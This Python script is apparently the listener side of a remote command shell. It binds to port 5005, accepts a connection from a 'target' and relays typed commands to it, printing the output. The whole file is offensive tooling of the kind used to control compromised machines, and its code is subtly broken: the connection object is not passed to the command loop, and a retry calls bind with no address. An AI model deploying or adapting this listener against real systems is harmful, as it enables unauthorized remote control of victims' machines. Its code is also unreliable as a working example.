import socket
import sys

def socket_create():
    try:
        global HOST
        global PORT
        global S
        HOST = ""
        PORT = 5005
        S = socket.socket()
    except socket.error as msg:
        print("error in socket create" + str(msg))

#socket binding wait for connection from host

def socket_bind():
    try:
        global HOST
        global PORT
        global S
        print("binding to socket port " + str(PORT))
        S.bind((HOST, PORT))
        S.listen(16)
    except socket.error as msg:
        print("socket binding error" + str(msg) + " retrying...")
        S.bind()

#establishes connection with host

def socket_accept():
    conn, address = S.accept()
    print("Connection Established at" + address[0]  + str(address[1]))
    send_commands()
    conn.close()

#sending commands to target

def send_commands():
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            S.close()
            sys.exit("exiting")
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

def main():
    socket_create()
    socket_bind()
    socket_accept()

if __name__ == '__main__':
    main()
